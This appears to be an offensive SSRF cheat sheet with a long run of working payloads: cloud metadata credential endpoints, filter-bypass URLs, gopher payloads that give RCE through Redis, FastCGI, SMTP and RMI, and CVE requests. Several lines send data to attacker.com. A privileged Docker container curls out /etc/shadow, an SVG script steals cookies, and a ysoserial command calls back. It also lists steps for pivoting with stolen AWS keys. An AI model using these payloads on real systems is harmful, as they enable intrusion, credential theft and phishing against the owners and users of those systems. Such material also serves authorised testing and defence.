# SSRF — Server-Side Request Forgery

## Overview

Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to an
attacker-controlled or internal destination. It earned its own category in OWASP Top 10
2021 (A10) due to the severity of cloud-environment exploitation.

**Impact:** Internal port scanning, cloud credential theft, RCE via internal services,
lateral movement inside cloud VPCs, full compromise of metadata-exposed infrastructure.

**Sources:**
- OWASP Top 10 A10:2021 — SSRF
- PortSwigger Web Security Academy — Server-side request forgery
- HackerOne Hacktivity — Capital One breach (SSRF → IMDSv1 → S3 dump), GitLab SSRF chain

---

## Basic SSRF Techniques

### Localhost / Internal Services

```
# Direct localhost
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin

# Internal RFC-1918 ranges to probe
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Common internal service ports to target
http://localhost:8080     # Alt HTTP / dev servers
http://localhost:8443     # Alt HTTPS
http://localhost:9200     # Elasticsearch
http://localhost:9300     # Elasticsearch cluster
http://localhost:6379     # Redis
http://localhost:5432     # PostgreSQL
http://localhost:3306     # MySQL
http://localhost:27017    # MongoDB
http://localhost:2375     # Docker daemon (unauthenticated)
http://localhost:4444     # Various admin panels
http://localhost:8500     # Consul
http://localhost:8600     # Consul DNS
```

### Port Scanning via SSRF

```
# Probe internal ports — infer open/closed from response time/error
http://127.0.0.1:22      # SSH (connection refused vs timeout → port state)
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3000    # Node dev servers
http://127.0.0.1:5000    # Flask / Python apps
http://127.0.0.1:8080
```

---

## Cloud Metadata Endpoints

### AWS EC2 Instance Metadata Service (IMDSv1)

```
# IMDSv1 — no token required (vulnerable if not upgraded to v2)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data/        # Often contains secrets/scripts
http://169.254.169.254/latest/dynamic/instance-identity/document

# Credential response contains AccessKeyId + SecretAccessKey + Token
# → exfil and use with AWS CLI
```

### AWS IMDSv2 (requires PUT token first)

```bash
# Step 1 — get token (requires PUT; SSRF via GET alone won't work)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2 — use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <TOKEN>

# Note: Some SSRF vectors support custom headers (e.g., Gopher) → IMDSv2 bypass possible
```

### GCP Compute Metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
# IP alternative:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Instance Metadata Service

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean / Oracle / Alibaba Cloud

```
# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

---

## Blind SSRF Detection

Blind SSRF has no visible response — detection requires out-of-band (OOB) callbacks.

### Out-of-Band via Collaborator / Interactsh

```
# Use Burp Collaborator or https://app.interactsh.com for callbacks
http://YOUR-COLLABORATOR-ID.burpcollaborator.net
http://YOUR-ID.oast.fun
http://YOUR-ID.interactsh.com

# Inject in every URL-accepting parameter:
url=http://YOUR-ID.oast.fun
imageUrl=http://YOUR-ID.oast.fun/img.png
webhook=http://YOUR-ID.oast.fun/callback
```

### DNS-Only SSRF

```
# Some filters block HTTP but allow DNS — test with a DNS-only payload
# Watch for DNS query in OOB tool with no HTTP
url=http://blind-ssrf-test.YOUR-ID.oast.fun

# Subdomain-encode info for exfil:
url=http://$(hostname).YOUR-ID.oast.fun
```

### Timing-Based Detection

```
# Internal closed port → fast TCP RST (quick error)
# Internal open port → slow/timeout or valid response
# Non-existent internal IP → timeout (longer delay)
# Compare response times to infer port/host state
```

---

## Filter Bypass Techniques

### IP Obfuscation

```
# Decimal representation of 127.0.0.1
http://2130706433/

# Octal
http://0177.0.0.1/

# Hex
http://0x7f000001/

# Mixed formats
http://127.0x0.0.1/
http://127.0.00.1/

# IPv6 localhost
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL-encoded dot
http://127%2E0%2E0%2E1/

# 169.254.169.254 decimal
http://2852039166/

# 169.254.169.254 hex
http://0xa9fea9fe/
```

### Alternative Localhost Representations

```
http://localhost/
http://LOCALHOST/
http://LocalHost/
http://[::]:80/          # IPv6 any → localhost equivalent in some stacks
http://spoofed.domain/   # DNS resolves to 127.0.0.1
http://127.1/            # Short form
http://127.0.1/
```

### DNS Rebinding

```
# Register a domain that alternately resolves to your server and 127.0.0.1
# 1. App resolves domain → your server (passes allowlist check)
# 2. App makes the actual request → DNS re-resolves to 127.0.0.1
# Tools: singularity.me, rbndr.us, whonow
http://rebind.network/  # Online rebinding service
```

### Open Redirect Chain

```
# If app follows redirects, use an open redirect on an allowlisted domain
# to redirect to internal target

# Example: target allowlists example.com
https://example.com/redirect?url=http://169.254.169.254/

# Common open redirect params: redirect, next, return, url, to, dest, go
```

### Protocol Switching

```
# file:// — read local files
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service account token

# dict:// — port probing, banner grabbing
dict://127.0.0.1:6379/info    # Redis INFO command

# gopher:// — arbitrary TCP data (most powerful)
gopher://127.0.0.1:6379/_FLUSHALL%0D%0A

# ftp:// — some parsers allow
ftp://127.0.0.1:21/

# sftp:// / tftp:// / ldap:// — varies by stack
```

### URL Parser Inconsistencies

```
# Different parsers may interpret these differently
http://attacker.com@127.0.0.1/           # username: attacker.com, host: 127.0.0.1
http://127.0.0.1#@allowlisted.com/       # fragment tricks
http://allowlisted.com:80@127.0.0.1/     # port + credential confusion
http://127.0.0.1%0d%0a/                  # CRLF injection in URL

# Scheme case variation
HTTP://127.0.0.1/
Http://127.0.0.1/
```

---

## SSRF to RCE Escalation

### Redis via Gopher (unauthenticated Redis → RCE)

```
# Write a cron job or SSH key via Redis CONFIG SET
# URL-encoded gopher payload to write authorized_keys:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2458%0D%0A%0A%0A%0Assh-rsa AAAA...your-pubkey...%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

# Tools: Gopherus (generates gopher payloads for Redis, MySQL, FastCGI, etc.)
# https://github.com/tarunkant/Gopherus
```

### Elasticsearch Code Execution (older versions)

```
# Elasticsearch <1.6 with dynamic scripting enabled
http://localhost:9200/_search?source={"script":"java.lang.Runtime.getRuntime().exec('id')"}

# POST to run scripts
POST http://localhost:9200/_search
{"script_fields":{"test":{"script":"import java.util.*;import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
```

### Jenkins Script Console

```
# Internal Jenkins at localhost:8080
http://localhost:8080/script

# If accessible, Groovy script console allows RCE:
# "println 'id'.execute().text"
```

### Spring Boot Actuator

```
# Spring Boot Actuator endpoints leak env vars, heap dumps, and allow shutdown
http://localhost:8080/actuator
http://localhost:8080/actuator/env
http://localhost:8080/actuator/heapdump
http://localhost:8080/actuator/shutdown    # POST → kills the app
http://localhost:8080/actuator/restart

# /actuator/env + /actuator/refresh → inject malicious Spring config for RCE
# (Spring Cloud + POST /actuator/env with spring.cloud.bootstrap.location=attacker URL)
```

### AWS Credential Theft → Account Pivot

```bash
# 1. Steal credentials via IMDSv1 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

# 2. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 3. Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ec2-role
aws s3 ls
aws secretsmanager list-secrets

# 4. Pivot to further services / escalate via overly-permissive role
```

---

## Common Vulnerable Parameters

```
# URL parameters frequently processed server-side
url=
imageUrl=
image_url=
avatarUrl=
avatar_url=
redirect=
next=
return=
returnUrl=
return_url=
dest=
destination=
go=
goto=
forward=
continue=
callback=
callbackUrl=
callback_url=
webhook=
webhookUrl=
webhook_url=
fetch=
endpoint=
proxy=
proxyUrl=
proxy_url=
src=
href=
link=
target=
host=
api=
feed=
data=
path=
load=
open=
download=
```

---

## Common Vulnerable Endpoints / Features

| Feature | Why Vulnerable |
|---------|---------------|
| Webhook configuration | App makes request to user-supplied URL |
| PDF generation (HTML-to-PDF) | Renders user HTML including external URLs |
| Image preview / thumbnail service | Fetches remote image via server |
| URL metadata unfurler (Slack-like) | Server fetches URL for title/OG tags |
| Import from URL | Imports CSV/JSON/XML from remote location |
| Screenshot service | Headless browser fetches URL |
| Proxy / translation service | Routes requests through server |
| OAuth / SAML metadata fetch | Fetches IdP metadata from URL |
| Dependency/package install via URL | Package manager fetches remote code |
| IP geolocation lookup | Passes host to internal geo API |

---

## Detection Notes

- Always test URL-accepting parameters with OOB payloads (Collaborator/Interactsh) first
- Check for DNS callbacks even when HTTP fails (DNS-only SSRF)
- Include SSRF probes in file upload fields (SVG with external references, XML with XXE)
- Test `Referer`, `X-Forwarded-For`, `Host` headers — some apps re-request based on these
- When you get any internal response (even an error page), escalate: try metadata endpoints
- Response timing differences reveal open vs closed ports even without response body

---

## Additional Bypass Vectors

### CIDR Range — Full 127.0.0.0/8 Loopback Block

```
# Any address in 127.0.0.0/8 resolves to loopback — not just 127.0.0.1
http://127.0.1.3/
http://127.100.200.50/
http://127.127.127.127/

# Useful when filter blocks 127.0.0.1 and localhost but doesn't check the full /8 range
```

### Ultra-Short IP Notation

```
http://0/              # Resolves to 0.0.0.0 → loopback on Linux
http://127.1/          # Short-form for 127.0.0.1
http://0177.1/         # Octal + short form
http://0x7f.1/         # Hex + short form
```

### PHP `filter_var()` FILTER_VALIDATE_URL Bypass

```
# PHP 7.x filter_var() passes these as valid URLs despite being malicious
http://test???test.com@127.0.0.1/
0://evil.com:80;http://google.com:80/
http://127.0.0.1%00@evil.com/

# If app uses filter_var() for validation, these bypass the check
```

### Unicode / Enclosed Alphanumeric Bypass

```
# Some parsers normalize Unicode before DNS resolution
# ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ resolves as example.com
# Use for allowlist bypass when filter does string comparison before normalization

http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/        # "localhost" in enclosed Unicode
http://①②⑦.⓪.⓪.①/         # 127.0.0.1 in enclosed numerals
```

### JAR Scheme (Java Environments)

```
# Fully blind — no response body, but server makes outbound connection
jar:http://127.0.0.1!/
jar:https://attacker.com!/payload.zip!/path/to/file

# Useful for Java apps (Spring, Tomcat) where other protocols are filtered
# Triggers HTTP request to the URL before the ! — confirm via OOB callback
```

### NETDOC Wrapper (Java)

```
# Java-specific alternative to file:// — bypasses some filters that block file://
netdoc:///etc/passwd
netdoc:///proc/self/environ

# Advantage: avoids \n and \r issues that file:// can have in certain contexts
```

### TFTP (UDP-based, Evades TCP Filters)

```
# TFTP operates over UDP — stateful TCP firewalls may not inspect it
tftp://attacker.com:69/TESTUDPPACKET

# Confirm OOB UDP callback with: nc -u -l -p 69
# Useful for environments with tight TCP egress but loose UDP
```

### Kubernetes Cluster Metadata

```
# K8s API server — commonly at 10.96.0.1 (default ClusterIP)
http://10.96.0.1/api/v1/namespaces/default/secrets
http://kubernetes.default.svc/api/v1/namespaces/
http://kubernetes.default.svc.cluster.local/api/v1/pods

# EKS node metadata (EC2 + K8s = two metadata surfaces)
http://169.254.169.254/latest/meta-data/   # EC2 metadata still present

# K8s service account token (mounted in every pod by default)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token with API server:
curl -H "Authorization: Bearer $(cat /var/run/secrets/...)" https://kubernetes.default.svc/api/v1/pods
```

### ECS Task Metadata (AWS Fargate)

```
# ECS containers have a per-task metadata endpoint (different from EC2 IMDS)
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials/<CREDENTIAL_ID>   # temporary IAM creds

# Get credential ID first:
http://169.254.170.2/v2/metadata  → look for "CredentialsRelativeUri"
→ then fetch that path for AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + TOKEN
```

### Memcached via Gopher

```
# Gopherus-generated gopher payload for Memcached
gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a

# Memcached SSRF can be used to:
# 1. Poison cached responses (cache poisoning)
# 2. Read cached data (session tokens, API responses)
# 3. If app uses Memcached for session storage → session injection → auth bypass

# Tool: gopherus --exploit memcache
```

---

## Domain-Based Bypass Services

### nip.io / localtest.me / localh.st / sslip.io

```
# These services resolve to the IP embedded in the subdomain
# Bypass string-based blocklists that never do DNS validation

http://127.0.0.1.nip.io/           # resolves to 127.0.0.1
http://127.0.0.1.nip.io:8080/admin
http://169.254.169.254.nip.io/     # resolves to IMDS
http://10.0.0.1.nip.io/            # internal RFC-1918 target

# localtest.me always resolves to 127.0.0.1
http://localtest.me/
http://admin.localtest.me:8080/

# sslip.io — same concept, alternative service
http://127.0.0.1.sslip.io/
```

**Root cause:** Allowlist check compares the hostname string to a blocklist but never resolves it. The service's DNS entry is what the server actually connects to.

**Bypass logic:** Attacker-controlled subdomain makes the DNS response point to 127.0.0.1 — the string itself passes the filter check.

---

### 1u.ms Advanced DNS Rebinding

```
# 1u.ms: creates a domain that alternates between two IPs on successive lookups
# More reliable and precise than singularity.me or rbndr.us

# Format: make-<IP1>-rebind-<IP2>-rr.1u.ms
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms

# First resolution → your VPS (passes allow-check)
# Second resolution → 169.254.169.254 (IMDS hit)
```

**Root cause:** App resolves domain once for validation and again for the actual request — TOCTOU. The TTL is set to 0, so the second lookup gets a different IP.

**Bypass logic:** Round-robin DNS flips between the attacker IP (for validation pass) and the internal target IP (for actual request).

---

## HTTP 307/308 Redirect — Method + Body Preservation

```
# 301/302 redirects change POST → GET (RFC compliant)
# 307/308 redirects PRESERVE method and body through the redirect

# Attack setup:
# 1. Host a page at https://attacker.com/ssrf that returns:
#    HTTP/1.1 307 Temporary Redirect
#    Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
#
# 2. Submit SSRF with: url=https://attacker.com/ssrf
# 3. App follows redirect → POST hits IMDS with original body intact
# 4. Works for apps that only follow redirects to https:// domains

# Redirect-as-a-service (no self-hosting needed):
# r3dir.me provides 307 redirect: https://r3dir.me/#to=<TARGET>

https://r3dir.me/#to=http://169.254.169.254/latest/meta-data/
```

**Root cause:** App validates the initial URL (allowlisted domain / HTTPS) but follows redirects without re-validating the final destination.

**Bypass logic:** Wrap an internal target behind a 307 redirect on a trusted/allowlisted domain. The app validates the redirect source, not the redirect destination.

**Stack:** Any framework that follows redirects by default — Python `requests`, Java `HttpURLConnection`, Node `axios`, Ruby `Net::HTTP`.

---

## URL Encoding Bypasses

### Full Hostname URL-Encoding

```
# URL-encode the entire hostname string
http://%6c%6f%63%61%6c%68%6f%73%74/          # "localhost"
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/  # "169.254.169.254"

# Double-encoded
http://%25%36c%25%36f%25%36...

# Mixed: encode only some chars
http://%6cocal%68ost/
```

**Root cause:** Filter does string comparison against a blocklist but doesn't URL-decode before comparing.

### Backslash @ Parser Discrepancy

```
# Different HTTP libraries parse the authority component differently
# urllib2 treats \ as part of path; requests treats it as authority separator
http://127.1.1.1:80\@127.2.2.2:80/

# Result: some libraries connect to 127.2.2.2, others to 127.1.1.1
# Useful when allowlist checks the parsed host from one library,
# but the actual request uses a different one
```

**Root cause:** RFC 3986 doesn't define `\` behavior in authority — implementations diverge. Server validates URL with Library A (sees 127.1.1.1), HTTP client uses Library B (connects to 127.2.2.2).

---

## XSLT / XML Parser SSRF

```xml
<!-- XSLT document() function fetches an external/internal URL during transform -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- xsl:import / xsl:include also trigger outbound requests -->
<xsl:import href="http://attacker.com/malicious.xsl"/>

<!-- XXE → SSRF chain: XXE reads file:// or triggers http:// fetch -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>

<!-- xsl:document() with internal service -->
<xsl:value-of select="document('http://localhost:9200/')"/>
```

**Root cause:** XSLT processors (libxslt, Xalan, Saxon) execute `document()` at transform time. Applications that accept user-supplied XSLT (report templates, data transformations) are directly exploitable.

**Attack chain:** SSRF → IMDS credential theft (AWS) OR SSRF → internal Elasticsearch/Redis discovery

**Stack:** Java (Saxon, Xalan), PHP (XSLTProcessor), Python (lxml), Ruby (Nokogiri).

---

## OAuth redirect_uri / jwks_uri SSRF

```
# OAuth AS fetches redirect_uri to validate (some naive implementations)
POST /oauth/authorize
client_id=app&redirect_uri=http://169.254.169.254/latest/meta-data/&...

# jwks_uri: AS fetches the JWKS endpoint to verify JWT signature
# If attacker can register a client with arbitrary jwks_uri:
POST /oauth/register
{"jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# metadata_url in SAML / OIDC discovery
POST /saml/metadata
metadata_url=http://169.254.169.254/

# request_uri parameter (OAuth PAR): server fetches the request object
POST /oauth/authorize
request_uri=http://169.254.169.254/latest/user-data
```

**Root cause:** OAuth/OIDC specs require servers to fetch several URLs (JWKS, metadata, request objects). Developers implement these fetches without blocking internal IP ranges.

**Attack chain:** SSRF → IMDS or internal API → credential theft → account takeover

**Stack:** Keycloak, Auth0, IdentityServer, any custom OAuth AS, OpenID Connect providers.

---

## SMTP via Gopher → Internal Mail Spoofing

```
# Send arbitrary email through internal SMTP (typically 127.0.0.1:25)
# Most internal SMTP relays don't authenticate local connections

gopher://127.0.0.1:25/_HELO%20localhost%0D%0AMAIL%20FROM%3A%3Cadmin%40target.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40target.com%3E%0D%0ADATA%0D%0AFrom%3A%20admin%40target.com%0D%0ATo%3A%20victim%40target.com%0D%0ASubject%3A%20Password%20Reset%0D%0A%0D%0AClick%20here%3A%20http%3A%2F%2Fattacker.com%2Freset%0D%0A.%0D%0AQUIT%0D%0A

# Decoded gopher payload:
HELO localhost
MAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: admin@target.com
To: victim@target.com
Subject: Password Reset

Click here: http://attacker.com/reset
.
QUIT
```

**Root cause:** Internal SMTP relays typically accept unauthenticated connections from localhost. Gopher's arbitrary TCP payload capability turns SSRF into an email injection primitive.

**Attack chain:** SSRF → internal SMTP → phishing email from trusted corporate sender → credential harvest

**Stack:** Postfix, Sendmail, Exim on localhost — any app in a corporate network with internal mail relay.

---

## FastCGI via Gopher → PHP RCE

```
# PHP-FPM/FastCGI runs on port 9000 by default — no authentication
# Gopher payload sets PHP_VALUE env vars to enable RCE

# Generate with Gopherus:
python3 gopherus.py --exploit fastcgi
# → enter PHP file path (e.g., /var/www/html/index.php) → enter command → copy payload

# Raw concept — FCGI_PARAMS injection:
# PHP_VALUE: allow_url_include=On  + auto_prepend_file=php://input
# + request body containing PHP code

gopher://127.0.0.1:9000/_%01%01...FCGI_PARAMS...PHP_VALUE=auto_prepend_file%3D%2Fetc%2Fpasswd...

# Alternative via PHP env var injection:
# PHP_ADMIN_VALUE=extension_dir + extension=/tmp/evil.so
```

**Root cause:** FastCGI protocol has no authentication by default. PHP-FPM bound to 0.0.0.0:9000 or 127.0.0.1:9000 accepts arbitrary PHP environment variable injection, which controls execution behavior.

**Attack chain:** SSRF → FastCGI port 9000 → arbitrary PHP execution → OS command → shell

**Stack:** PHP-FPM + nginx (extremely common deployment), any PHP app with php-fpm.

---

## Java RMI via Gopher → Deserialization RCE

```
# Java RMI registry default port: 1099
# Gopher sends crafted deserialization payload to trigger ysoserial gadget chain

# Using remote-method-guesser (rmg) + SSRF:
# 1. Discover RMI registry: dict://127.0.0.1:1099/
# 2. Send ysoserial payload via gopher:
gopher://127.0.0.1:1099/_<URL-ENCODED-YSOSERIAL-PAYLOAD>

# Generate payload:
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/rce" | xxd -p | tr -d '\n'
# URL-encode and prepend to gopher:// URL

# Alternatively: JMX on port 9010 accepts serialized objects over HTTP
gopher://127.0.0.1:9010/...
```

**Root cause:** Java RMI uses Java serialization for all communication. Unauthenticated RMI registries (common in legacy enterprise apps) accept any deserialization payload. Gopher delivers raw TCP bytes needed for the RMI handshake.

**Attack chain:** SSRF → RMI:1099 → ysoserial payload → OS command execution → shell

**Stack:** Java enterprise apps (JBoss, WebLogic, old Spring apps), anything running `rmiregistry`.

---

## CVE-Based SSRF Targets

### WebLogic UDDI Explorer (CVE-2014-4210)

```
# WebLogic UDDI Explorer component makes server-side HTTP requests
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:8080/

# CVE-2020-14883: WebLogic console SSRF
GET /console/consolejndi.portal?_nfpb=true&_pageLabel=JNDIBindingPageGeneral&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("http://127.0.0.1:9200/")
```

### Confluence SSRF (CVE-2017-9506)

```
# iconUriServlet in Confluence / JIRA acts as an open proxy
GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/
```

### Jira SSRF (CVE-2019-8451)

```
# makeRequest servlet — unauthenticated in affected versions
GET /plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/
```

### Hystrix Dashboard SSRF (CVE-2020-5412)

```
# Spring Cloud Netflix Hystrix Dashboard proxy endpoint
GET /proxy.stream?origin=http://169.254.169.254/latest/meta-data/
```

### Apache Solr SSRF (shards parameter)

```
# Solr's distributed search "shards" parameter triggers server-side HTTP requests
GET /solr/collection/select?q=*:*&shards=http://169.254.169.254/latest/meta-data/
GET /solr/collection/select?q=*:*&shards=http://attacker.com:80/
```

**Root cause:** All of these expose URL-accepting parameters or servlets without proper SSRF controls. The vulnerable endpoints are reachable without authentication in many deployments, making internal Confluence/Jira/Solr instances prime targets when reached via SSRF from another SSRF-vulnerable service.

---

## Docker Daemon API → Container Escape + Host RCE

```
# Docker daemon on port 2375 (HTTP, unauthenticated) is exposed in dev/misconfigured envs
# SSRF to Docker API → create privileged container → mount host filesystem → host RCE

# Step 1: Verify Docker API accessible
http://127.0.0.1:2375/version

# Step 2: List containers/images
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json

# Step 3: Create privileged container mounting host / 
# POST /containers/create (via gopher):
gopher://127.0.0.1:2375/_POST%20/containers/create%20HTTP/1.1%0D%0A...
# Body:
{
  "Image": "alpine",
  "Cmd": ["chroot", "/mnt", "bash", "-c", "curl http://attacker.com/?$(cat /etc/shadow | base64)"],
  "HostConfig": {
    "Binds": ["/:/mnt"],
    "Privileged": true
  }
}

# Step 4: Start container
# POST /containers/<id>/start

# Full automation: Gopherus docker module or use SSRFmap
python3 ssrfmap.py -r request.txt -p url -m docker
```

**Root cause:** Docker daemon TCP socket on 2375 has no authentication by default. Privileged containers with host filesystem mounts provide full host access.

**Attack chain:** SSRF → Docker:2375 → privileged container create → host filesystem read/write → full host RCE

---

## EKS Node Metadata

```
# EKS (Elastic Kubernetes Service) nodes are EC2 instances
# They expose BOTH standard EC2 IMDS AND EKS-specific metadata

# EC2 IMDS on EKS node — contains bootstrap credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# EKS-specific: node bootstrap token (used to join cluster)
# Found in user-data during cluster formation:
http://169.254.169.254/latest/user-data   # may contain --token or bootstrap scripts

# EKS node IAM role typically has:
# - ec2:Describe* permissions (enumerate entire VPC)
# - ecr:GetAuthorizationToken (pull private container images)
# - May have broader permissions depending on node group config

# EKS Pod Identity (newer, replaces IRSA in some configs):
# Credential URI is injected via AWS_CONTAINER_CREDENTIALS_FULL_URI env var
# Fetch from inside pod: GET $AWS_CONTAINER_CREDENTIALS_FULL_URI
# Common value: http://169.254.170.23/v1/credentials

# IMDS hop from pod → node:
# If pod has host network or misconfigured network policy, IMDS is reachable
```

**Root cause:** EKS nodes are EC2 instances with IAM roles. Pod-level SSRF that reaches 169.254.169.254 gets node-level AWS credentials, not just pod-level ones. EKS Pod Identity endpoint `169.254.170.23` is newer and less filtered.

**Attack chain:** SSRF in EKS pod → node IMDS → EC2 IAM role creds → ECR image pull + EC2 enumeration → lateral movement

---

## SVG SSRF → XSS Escalation

```xml
<!-- SVG files support external resource loading and script execution -->
<!-- Upload or inject an SVG with an external reference: -->

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">

  <!-- SSRF: server fetches external URL when processing SVG -->
  <image href="http://169.254.169.254/latest/meta-data/" x="0" y="0" height="100" width="100"/>

  <!-- XSS if SVG is rendered in browser (not sanitized) -->
  <script>fetch('https://attacker.com/x?'+document.cookie)</script>

  <!-- Blind SSRF via SVG filter with external reference -->
  <filter id="f">
    <feImage href="http://attacker-oob.com/callback"/>
  </filter>
</svg>
```

**Root cause:** Image processing pipelines (ImageMagick, Inkscape, rsvg) resolve external `href` attributes server-side when rasterizing SVGs. When the SVG is rendered in-browser (e.g., as an avatar), embedded `<script>` tags execute.

**Attack chain (SSRF):** SVG upload → server-side render → `<image href>` fetches internal URL → SSRF

**Attack chain (XSS):** SVG stored as avatar/attachment → rendered in browser without sanitization → `<script>` executes → XSS → ATO

**Stack:** ImageMagick (server-side), any app that stores and serves user SVGs inline.

---

## Threat Model

> Current patterns as of 2026-05-23. Update each session.

**What's being exploited in the wild (2026-05-23):**

1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
   #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
   og:image generators. The renderer fetches attacker-controlled HTML, which includes
   `<script>` that hits internal metadata.

2. **IMDSv1 still common** — Despite AWS pressure to upgrade, IMDSv1 is found in
   ~30% of EC2 fleets (per disclosed reports). Legacy Terraform modules, AMI defaults,
   and inherited deployments keep it alive. Always try IMDSv1 first.

3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`), EKS node
   IMDS (`169.254.169.254` with node-level role), EKS Pod Identity (`169.254.170.23`),
   and K8s service account tokens (`file:///var/run/secrets/...`) are the most impactful
   targets. All yield short-lived IAM credentials or cluster API access.

4. **Webhook features as SSRF entry points** — Every app that allows users to configure
   webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
   webhook + IMDSv1 = critical AWS credential theft.

5. **gopher:// is increasingly blocked** — WAFs and server-side allowlists now commonly
   block `gopher://`. Pivot to `dict://` for Redis INFO, chain through 307/308 redirects
   (method-preserving), or chain through open redirects to reach internal services.

6. **OAuth/OIDC metadata fetching is an emerging class** — `jwks_uri`, `redirect_uri`,
   and `request_uri` parameters in OAuth flows trigger server-side fetches. Authorization
   servers that accept user-registered clients are especially vulnerable. Low-hanging fruit
   on platforms that implement custom OAuth servers.

7. **Domain bypass services (nip.io / 1u.ms) make filter bypass trivial** — Most
   blocklist-based SSRF defenses do hostname string matching, not DNS pre-resolution.
   nip.io and sslip.io make this bypass one URL away, no infrastructure needed.

8. **XSLT/XML processors as SSRF vectors** — Report generation, data transformation,
   and document conversion features frequently use XSLT. The `document()` function in
   XSLT triggers outbound HTTP — attacker-supplied XSLT templates mean direct SSRF.

9. **FastCGI on port 9000 is underreported** — PHP-FPM bound to all interfaces (common
   misconfiguration) combined with SSRF equals PHP RCE via Gopherus. High-impact, low
   awareness among defenders.

---

## Bypass Matrix

| Filter Type | Best Bypass | Notes |
|-------------|-------------|-------|
| Blocks `127.0.0.1` | `127.127.127.127` or decimal `2130706433` | Full /8 loopback block |
| Blocks `localhost` | `[::1]` or Unicode `ⓛⓞⓒⓐⓛⓗⓞⓢⓣ` | Case + protocol variation |
| Blocks `169.254.169.254` | `2852039166` (decimal) or `0xa9fea9fe` (hex) | Numeric encoding |
| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on whitelisted domain | URL parser confusion |
| Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
